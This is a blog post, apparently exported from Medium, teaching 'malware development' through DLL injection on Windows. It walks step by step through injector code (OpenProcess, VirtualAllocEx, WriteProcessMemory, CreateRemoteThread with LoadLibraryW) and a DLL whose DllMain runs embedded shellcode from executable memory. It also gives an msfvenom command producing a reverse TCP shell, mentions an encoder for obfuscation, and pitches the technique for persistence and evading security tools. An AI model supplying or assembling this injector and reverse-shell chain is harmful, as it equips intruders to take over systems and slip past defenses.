---
layout: post
title: "Malware Development Part 2: DLL Injection"
date: 2025-08-26
categories: [Malware Development,Red Team,DLL,C Programming]
image: https://cdn-images-1.medium.com/v2/resize:fit:800/1*jRbFFS4HqKPeyX2b1t4TNg.png
---


### Introduction to DLLs and Their Role

A **Dynamic Link Library (DLL)** is a core concept in the Windows operating system. DLL files contain code, data, and resources that multiple programs can use simultaneously, promoting modular and efficient programming.

Unlike executable files, DLLs are not directly run by the system. Instead, they are **loaded into a process’s memory space**, allowing functions and data within the DLL to be accessed by the calling application. This reduces redundancy because programs can share code and resources provided by a single DLL.

For example:

*   **System DLLs** like `kernel32.dll` provide essential functions such as file operations and process management.
*   **Custom DLLs** allow developers to modularize their code into reusable components.

When a program needs a function from a DLL, the **Windows Loader** handles the dynamic linking process:

1.  **Load the DLL into the memory of the target process.**
2.  **Resolve the addresses of required functions or variables.**
3.  Allow the program to call these functions as though they were part of its own code.

- - -

### DLL Injection Overview

In the article, we exploit this behavior to introduce **malicious DLLs** into target processes for educational purposes. By doing so, we can execute shellcode within the process’s memory, bypassing traditional defenses

**DLL Injection: A Core Technique in Malware Development**

DLL Injection is a sophisticated method that allows an attacker to inject a dynamic-link library (DLL) into the memory space of a running process. This enables the attacker to execute malicious or custom code within the context of that process, effectively gaining the same privileges and capabilities as the process itself.

### How Does DLL Injection Work?

The essence of DLL injection lies in manipulating a target process to load and execute the attacker’s DLL. This is achieved by exploiting legitimate Windows mechanisms, such as memory allocation and thread creation, to make the injection seamless and stealthy. Here’s an overview of the typical steps involved in this technique:

1.  **Target Process Identification**: The attacker identifies a process to inject into, often one with higher privileges or access to sensitive data.
2.  **Memory Allocation in the Target Process**: Using Windows APIs like `VirtualAllocEx`, the attacker reserves space in the target process's memory.
3.  **Writing the DLL Path**: The path to the malicious DLL is written into the allocated memory using `WriteProcessMemory`.
4.  **Loading the DLL**: The attacker uses⁣`CreateRemoteThread` or other threading techniques to call `LoadLibraryW` (or a similar function), forcing the target process to load the DLL.

### Why Use DLL Injection?

Attackers and software developers leverage DLL injection for various reasons:

*   **Persistence**: Malicious code can remain active by attaching itself to processes that restart frequently (e.g., explorer.exe).
*   **Evasion**: By executing code within legitimate processes, attackers can bypass certain security tools or sandboxes.
*   **Monitoring and Manipulation**: DLL Injection allows an attacker to monitor the activity of a process or alter its behavior dynamically.

#### The Attack Workflow in Detail

wchar\_t dllpath\[MAX\_PATH\] \= L"C:\\\\path\\\\to\\\\DLL.dll"; // Path to the DLL  
size\_t dllPathSize \= sizeof(dllpath); // Size of the DLL path in bytes

*   `**wchar_t**`: Wide-character string type for Unicode compatibility.
*   `**MAX_PATH**`: The maximum length of a path string in Windows (260 characters).
*   `**sizeof(dllpath)**`: Calculates the size of the DLL path.

### Open the Target Process

hProcess = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, PID);

*   `**OpenProcess**`: Retrieves a handle to the target process.
*   `**PROCESS_ALL_ACCESS**`: Grants full access rights.
*   `**FALSE**`: Specifies whether child processes inherit the handle.
*   `**PID**`: The process ID of the target process.

If the handle is `NULL`, the process could not be opened. Use `GetLastError()` to fetch the error code.

### Allocate Memory in the Target Process

rbuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM\_COMMIT | MEM\_RESERVE, PAGE\_READWRITE);

*   `**VirtualAllocEx**`: Reserves and commits memory in the address space of the target process.
*   `**hProcess**`: Handle to the target process.
*   `**NULL**`: Lets the system choose the address.
*   `**dllPathSize**`: Size of the memory block.
*   `**MEM_COMMIT | MEM_RESERVE**`: Commits and reserves memory.
*   `**PAGE_READWRITE**`: Memory protection allowing both read and write.

- - -

### Write the DLL Path to the Allocated Memory

if (!WriteProcessMemory(hProcess, rbuffer, dllpath, dllPathSize, NULL)) {

*   `**WriteProcessMemory**`: Writes data to the allocated memory in the target process.
*   `**hProcess**`: Handle to the target process.
*   `**rbuffer**`: Address of the allocated memory.
*   `**dllpath**`: Pointer to the data (DLL path).
*   `**dllPathSize**`: Size of the data.

- - -

### Get the Address of `LoadLibraryW`

hKernel32 = GetModuleHandleW(L"Kernel32");  
LPTHREAD\_START\_ROUTINE start \= (LPTHREAD\_START\_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

*   `**GetModuleHandleW**`: Retrieves a handle to `Kernel32.dll`, which is loaded in all processes.
*   `**GetProcAddress**`: Gets the address of the `LoadLibraryW` function in `Kernel32.dll`.

- - -

### Create a Remote Thread to Load the DLL

hThread = CreateRemoteThread(hProcess, NULL, 0, start, rbuffer, 0, &TID);

*   `**CreateRemoteThread**`: Creates a thread in the target process to execute `LoadLibraryW`.
*   `**hProcess**`: Handle to the target process.
*   `**NULL**`: Default security attributes.
*   `**0**`: Default stack size.
*   `**start**`: Address of `LoadLibraryW`.
*   `**rbuffer**`: DLL path as the argument.
*   `**0**`: No creation flags. if `0`, the thread is run immediately after creation.
*   `**&TID**`: Receives the thread ID.
*   This call starts a new thread in the target process, executing the `LoadLibraryW` function with the DLL path as its parameter (`rbuffer`). This causes the target process to load the specified DLL, completing the injection.

- - -

### Wait for the Thread to Complete

WaitForSingleObject(hThread, INFINITE);

*   `**WaitForSingleObject**`: Waits for the thread to finish execution.
*   `**hThread**`: Handle to the remote thread.
*   `**INFINITE**`: Timeout value indicating to wait indefinitely.

- - -

### Clean Up

VirtualFreeEx(hProcess, rbuffer, 0, MEM\_RELEASE);  
CloseHandle(hThread);  
CloseHandle(hProcess);

*   `**VirtualFreeEx**`: Frees the allocated memory in the target process.
*   `**hProcess**`: Handle to the target process.
*   `**rbuffer**`: Address of the memory to free.
*   `**MEM_RELEASE**`: Frees the memory.
*   `**CloseHandle**`: Closes the handles to the process and thread.

### **The DLL File**

#### Function: `DllMain`

The `DllMain` function is the entry point for a DLL. Windows calls it automatically when the DLL is loaded or unloaded. It takes three arguments:

1.  `**HINSTANCE hinstDLL**`

*   A handle to the DLL module.
*   Used to identify the DLL during the current process.

`**2. DWORD fdwReason**`

*   Indicates why the function is being called:
*   `DLL_PROCESS_ATTACH`: Called when the DLL is loaded into a process.
*   `DLL_PROCESS_DETACH`: Called when the DLL is unloaded from a process.

`**3. LPVOID lpReserved**`

*   Reserved for future use; generally ignored.

- - -

#### Logic inside `DllMain`:

*   `**DLL_PROCESS_ATTACH**`**:**
*   When the DLL is loaded into a process, a new thread is created using `CreateThread`.
*   The thread executes the `ShellcodeExec` function.

- - -

### Function: `ShellcodeExec`

This function executes the embedded shellcode when the thread starts. Let’s break it down:

#### Step 1: Allocate Memory

void\* exec\_mem = VirtualAlloc(0, sizeof(shellcode), MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);

*   `**VirtualAlloc**`: Allocates memory in the current process with the specified properties.
*   `0`: Allows the system to choose the starting address.
*   `sizeof(shellcode)`: Size of the memory region (equal to the shellcode size).
*   `MEM_COMMIT`: Reserves and commits the memory, making it accessible.
*   `PAGE_EXECUTE_READWRITE`: Grants read, write, and execute permissions to the allocated memory.

- - -

#### Step 2: Copy Shellcode to Memory

RtlMoveMemory(exec\_mem, shellcode, sizeof(shellcode));

*   `**RtlMoveMemory**`: Copies the shellcode into the allocated memory.
*   `exec_mem`: Destination.
*   `shellcode`: Source.
*   `sizeof(shellcode)`: Number of bytes to copy.

If copying fails, the error is logged, and the allocated memory is freed using `VirtualFree`.

- - -

#### Step 3: Execute the Shellcode

((void(\*)())exec\_mem)();

*   The allocated memory is cast to a function pointer of type `void(*)()`.
*   The shellcode is then executed by calling the function pointer.

- - -

#### Step 4: Free Allocated Memory

VirtualFree(exec\_mem, 0, MEM\_RELEASE);

*   Releases the memory region allocated earlier. This step is optional since the process is likely to exit after execution.

- - -

### Code Workflow Summary

1.  When the DLL is injected and loaded into a process, `DllMain` runs.
2.  A new thread is created in `DLL_PROCESS_ATTACH` to execute `ShellcodeExec`.
3.  `ShellcodeExec`:

*   Allocates memory for the shellcode.
*   Copies the shellcode into the allocated memory.
*   Executes the shellcode.
*   Frees the allocated memory after execution.

**Generate a shell code using MsfVenom**

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=<ip> LPORT=<port> -f c -b "\\x00" -a x64

*   `-a x64`: For 64-bit architecture.
*   `-b "\x00"`: To avoid certain bad characters in the shellcode.
*   `-e x86/shikata_ga_nai`: To use a polymorphic encoder to make the shellcode more obfuscated.

**Start Listener**:

*   On your attacking machine, use a tool like `msfconsole` to start a listener to receive the reverse shell connection.

![](https://cdn-images-1.medium.com/max/1200/1*y7Z1_1vPGiNUy5blWCujHA.png)

![](https://cdn-images-1.medium.com/max/800/1*m1F1a7blt62KH31ltyUnmw.png)

### Use in DLL Injection

*   **Purpose**: Executes shellcode in the target process when the DLL is loaded.
*   **Mechanism**: Combines thread creation, memory allocation, and shellcode execution.
*   **Why** `**DllMain**`**?**: The Windows loader automatically calls `DllMain` when a DLL is injected, making it the perfect entry point for executing custom logic.

### Full Code Repository

You can find the full code and examples discussed in this article on my **GitHub repository**:

[https://github.com/Moataz51201/DLL-Injection](https://github.com/Moataz51201/DLL-Injection)

**Microsoft’s Official Documentation**:  
[Windows API Reference](https://learn.microsoft.com/en-us/windows/win32/api/): Provides comprehensive details on every function, structure, and constant.

Stay tuned for the next episode.

By [Moataz Osama](https://medium.com/@mezo512) on [November 22, 2024](https://medium.com/p/536c7b1f378f).

[Canonical link](https://medium.com/@mezo512/malware-development-part-2-dll-injection-536c7b1f378f)

Exported from [Medium](https://medium.com) on August 26, 2025.